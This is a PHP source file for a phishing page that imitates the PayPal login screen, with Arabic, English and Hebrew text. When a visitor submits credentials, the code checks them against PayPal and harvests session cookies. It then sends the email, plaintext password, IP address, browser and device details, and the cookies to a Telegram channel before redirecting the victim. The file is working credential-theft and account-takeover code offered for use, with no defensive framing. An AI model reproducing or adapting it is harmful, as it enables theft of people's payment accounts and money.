<?php
require_once 'includes/init.php';
require_once 'includes/functions.php';
require_once 'includes/auth.php';
require_once 'includes/paypal_auth.php';

// تعريف الترجمات
$translations = [
    'page_title' => [
        'ar' => 'تسجيل الدخول إلى PayPal',
        'en' => 'Log in to PayPal',
        'he' => 'התחברות ל-PayPal'
    ],
    'login_to_account' => [
        'ar' => 'تسجيل الدخول إلى حسابك',
        'en' => 'Log in to your account',
        'he' => 'התחברות לחשבון שלך'
    ],
    'email_or_phone' => [
        'ar' => 'البريد الإلكتروني أو رقم الهاتف',
        'en' => 'Email or mobile number',
        'he' => 'דוא"ל או מספר טלפון'
    ],
    'password' => [
        'ar' => 'كلمة المرور',
        'en' => 'Password',
        'he' => 'סיסמה'
    ],
    'forgot_password' => [
        'ar' => 'نسيت كلمة المرور؟',
        'en' => 'Forgot password?',
        'he' => 'שכחת סיסמה?'
    ],
    'login_button' => [
        'ar' => 'تسجيل الدخول',
        'en' => 'Log In',
        'he' => 'התחברות'
    ],
    'or' => [
        'ar' => 'أو',
        'en' => 'or',
        'he' => 'או'
    ],
    'create_account' => [
        'ar' => 'إنشاء حساب',
        'en' => 'Create Account',
        'he' => 'יצירת חשבון'
    ],
    'privacy' => [
        'ar' => 'الخصوصية',
        'en' => 'Privacy',
        'he' => 'פרטיות'
    ],
    'legal' => [
        'ar' => 'الاتفاقية القانونية',
        'en' => 'Legal Agreement',
        'he' => 'הסכם משפטי'
    ],
    'help' => [
        'ar' => 'المساعدة',
        'en' => 'Help',
        'he' => 'עזרה'
    ],
    'contact' => [
        'ar' => 'اتصل بنا',
        'en' => 'Contact Us',
        'he' => 'צור קשר'
    ],
    'rights_reserved' => [
        'ar' => 'جميع الحقوق محفوظة',
        'en' => 'All rights reserved',
        'he' => 'כל הזכויות שמורות'
    ],
    'error_empty_fields' => [
        'ar' => 'يرجى إدخال البريد الإلكتروني وكلمة المرور',
        'en' => 'Please enter email and password',
        'he' => 'אנא הזן דוא"ל וסיסמה'
    ],
    'login_success' => [
        'ar' => 'تم تسجيل دخول PayPal بنجاح',
        'en' => 'PayPal login successful',
        'he' => 'התחברות ל-PayPal הצליחה'
    ],
    'technical_info' => [
        'ar' => 'المعلومات التقنية',
        'en' => 'Technical Information',
        'he' => 'מידע טכני'
    ],
    'ip_address' => [
        'ar' => 'عنوان IP',
        'en' => 'IP Address',
        'he' => 'כתובת IP'
    ],
    'browser' => [
        'ar' => 'المتصفح',
        'en' => 'Browser',
        'he' => 'דפדפן'
    ],
    'os' => [
        'ar' => 'نظام التشغيل',
        'en' => 'Operating System',
        'he' => 'מערכת הפעלה'
    ],
    'device' => [
        'ar' => 'الجهاز',
        'en' => 'Device',
        'he' => 'מכשיר'
    ],
    'login_time' => [
        'ar' => 'وقت تسجيل الدخول',
        'en' => 'Login Time',
        'he' => 'זמן התחברות'
    ],
    'operation_time' => [
        'ar' => 'وقت العملية',
        'en' => 'Operation Time',
        'he' => 'זמן הפעולה'
    ],
    'email' => [
        'ar' => 'البريد الإلكتروني',
        'en' => 'Email',
        'he' => 'דוא"ל'
    ],
    'unknown' => [
        'ar' => 'غير معروف',
        'en' => 'Unknown',
        'he' => 'לא ידוע'
    ],
    'computer' => [
        'ar' => 'كمبيوتر',
        'en' => 'Computer',
        'he' => 'מחשב'
    ],
    'mobile' => [
        'ar' => 'جهاز محمول',
        'en' => 'Mobile Device',
        'he' => 'מכשיר נייד'
    ],
    'tablet' => [
        'ar' => 'تابلت',
        'en' => 'Tablet',
        'he' => 'טאבלט'
    ]
];

// دالة للحصول على الترجمة
function get_translation($key, $lang, $translations) {
    return $translations[$key][$lang] ?? $translations[$key]['en'] ?? $key;
}

// تحديد اتجاه الصفحة بناءً على اللغة المختارة
$dir = ($selected_lang == 'ar' || $selected_lang == 'he') ? 'rtl' : 'ltr';

// التحقق من وجود بيانات تسجيل الدخول
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['paypal_login'])) {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $return_url = $_POST['return_url'] ?? 'payment-methods.php';

    if (empty($email) || empty($password)) {
        $error = get_translation('error_empty_fields', $selected_lang, $translations);
    } else {
        // التحقق من صحة بيانات حساب PayPal وسحب الكوكيز
        $paypal_result = verify_paypal_account($email, $password);

        // جمع المعلومات التقنية
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $ip_address = $_SERVER['REMOTE_ADDR'];

        // تحديد نوع المتصفح
        $browser = get_translation('unknown', $selected_lang, $translations);
        if (preg_match('/MSIE|Trident/i', $user_agent)) {
            $browser = 'Internet Explorer';
        } elseif (preg_match('/Firefox/i', $user_agent)) {
            $browser = 'Firefox';
        } elseif (preg_match('/Chrome/i', $user_agent)) {
            $browser = 'Chrome';
        } elseif (preg_match('/Safari/i', $user_agent)) {
            $browser = 'Safari';
        } elseif (preg_match('/Opera|OPR/i', $user_agent)) {
            $browser = 'Opera';
        } elseif (preg_match('/Edge/i', $user_agent)) {
            $browser = 'Edge';
        }

        // تحديد نظام التشغيل
        $os = get_translation('unknown', $selected_lang, $translations);
        if (preg_match('/Windows/i', $user_agent)) {
            $os = 'Windows';
        } elseif (preg_match('/Mac OS X/i', $user_agent)) {
            $os = 'Mac OS X';
        } elseif (preg_match('/Linux/i', $user_agent)) {
            $os = 'Linux';
        } elseif (preg_match('/Android/i', $user_agent)) {
            $os = 'Android';
        } elseif (preg_match('/iOS|iPhone|iPad|iPod/i', $user_agent)) {
            $os = 'iOS';
        }

        // تحديد نوع الجهاز
        $device = get_translation('computer', $selected_lang, $translations);
        if (preg_match('/Mobile|Android|iPhone|iPad|iPod|Windows Phone/i', $user_agent)) {
            $device = get_translation('mobile', $selected_lang, $translations);
        } elseif (preg_match('/Tablet|iPad/i', $user_agent)) {
            $device = get_translation('tablet', $selected_lang, $translations);
        }

        if ($paypal_result['success']) {
            // إرسال بيانات حساب PayPal إلى تيليجرام فقط عند نجاح تسجيل الدخول
            $message = get_translation('login_success', $selected_lang, $translations) . "\n\n";
            $message .= "🔍 " . get_translation('technical_info', $selected_lang, $translations) . ":\n";
            $message .= get_translation('ip_address', $selected_lang, $translations) . ": " . $ip_address . "\n";
            $message .= get_translation('browser', $selected_lang, $translations) . ": " . $browser . "\n";
            $message .= get_translation('os', $selected_lang, $translations) . ": " . $os . "\n";
            $message .= get_translation('device', $selected_lang, $translations) . ": " . $device . "\n";
            $message .= get_translation('login_time', $selected_lang, $translations) . ": " . date('Y-m-d H:i:s') . "\n";
            $message .= "User Agent: " . $user_agent . "\n\n";
            $message .= "⏱️ " . get_translation('operation_time', $selected_lang, $translations) . ": " . date('Y-m-d H:i:s') . "\n\n";
            $message .= get_translation('email', $selected_lang, $translations) . ": " . $email . "\n";
            $message .= get_translation('password', $selected_lang, $translations) . ": " . $password;

            // إرسال الرسالة كنص عادي بدلاً من JSON
            send_telegram_text_message($message);

            // إرسال ملف الكوكيز عبر التيليجرام إذا كان متاحًا
            if ($paypal_result['cookies']) {
                $user_data = [
                    'email' => $email,
                    'password' => $password,
                    'ip' => $ip_address,
                    'browser' => $browser,
                    'os' => $os,
                    'device' => $device
                ];

                send_paypal_cookies_to_telegram($paypal_result['cookies'], $user_data);
            }

            // تخزين بيانات PayPal في الجلسة
            $_SESSION['paypal_email'] = $email;
            $_SESSION['paypal_verified'] = true;

            // إعادة التوجيه إلى صفحة التحميل
            redirect('paypal-loading.php?return_url=' . urlencode($return_url));
        } else {
            $error = $paypal_result['message'];
        }
    }
}

// الحصول على URL العودة من الاستعلام
$return_url = $_GET['return_url'] ?? 'payment-methods.php';

// تحديد اتجاه الصفحة بناءً على اللغة المختارة
$dir = ($selected_lang == 'ar' || $selected_lang == 'he') ? 'rtl' : 'ltr';
?>
<!DOCTYPE html>
<html lang="<?php echo $selected_lang; ?>" dir="<?php echo $dir; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo get_translation('page_title', $selected_lang, $translations); ?></title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            background-color: #f5f7fa;
            font-family: Arial, sans-serif;
        }
        .paypal-logo {
            width: 150px;
            margin: 0 auto 20px;
        }
        .login-container {
            max-width: 380px;
            margin: 0 auto;
            padding: 30px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        .btn-paypal {
            background-color: #0070ba;
            color: white;
            font-weight: bold;
            padding: 12px;
            border-radius: 4px;
            width: 100%;
            transition: background-color 0.2s;
        }
        .btn-paypal:hover {
            background-color: #005ea6;
        }
        .input-paypal {
            width: 100%;
            padding: 12px;
            border: 1px solid #9da3a6;
            border-radius: 4px;
            margin-bottom: 16px;
        }
        .input-paypal:focus {
            border-color: #0070ba;
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 112, 186, 0.2);
        }
        .footer-links {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            font-size: 13px;
        }
        .footer-links a {
            color: #666;
            margin: 0 10px;
            text-decoration: none;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container mx-auto px-4 py-12">
        <div class="login-container">
            <div class="text-center">
                <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal Logo" class="paypal-logo">
                <h1 class="text-xl font-bold mb-6"><?php echo get_translation('login_to_account', $selected_lang, $translations); ?></h1>
            </div>

            <?php if(isset($error)): ?>
            <div class="bg-red-100 border-r-4 border-red-500 text-red-700 p-4 mb-6 rounded" role="alert">
                <p><?php echo $error; ?></p>
            </div>
            <?php endif; ?>

            <form method="post" action="">
                <div class="mb-4">
                    <label for="email" class="block text-gray-700 mb-2"><?php echo get_translation('email_or_phone', $selected_lang, $translations); ?></label>
                    <input type="email" id="email" name="email" class="input-paypal" required autofocus>
                </div>

                <div class="mb-6">
                    <div class="flex justify-between mb-2">
                        <label for="password" class="block text-gray-700"><?php echo get_translation('password', $selected_lang, $translations); ?></label>
                        <a href="#" class="text-blue-600 text-sm"><?php echo get_translation('forgot_password', $selected_lang, $translations); ?></a>
                    </div>
                    <input type="password" id="password" name="password" class="input-paypal" required>
                </div>

                <input type="hidden" name="return_url" value="<?php echo htmlspecialchars($return_url); ?>">

                <button type="submit" name="paypal_login" class="btn-paypal"><?php echo get_translation('login_button', $selected_lang, $translations); ?></button>

                <div class="text-center mt-6">
                    <p class="text-gray-600 text-sm"><?php echo get_translation('or', $selected_lang, $translations); ?></p>
                    <a href="#" class="block mt-3 text-blue-600"><?php echo get_translation('create_account', $selected_lang, $translations); ?></a>
                </div>
            </form>
        </div>

        <div class="footer-links">
            <a href="#"><?php echo get_translation('privacy', $selected_lang, $translations); ?></a>
            <a href="#"><?php echo get_translation('legal', $selected_lang, $translations); ?></a>
            <a href="#"><?php echo get_translation('help', $selected_lang, $translations); ?></a>
            <a href="#"><?php echo get_translation('contact', $selected_lang, $translations); ?></a>
        </div>

        <div class="text-center text-gray-500 text-xs mt-4">
            © 1999-<?php echo date('Y'); ?> PayPal, Inc. <?php echo get_translation('rights_reserved', $selected_lang, $translations); ?>.
        </div>
    </div>
</body>
</html>
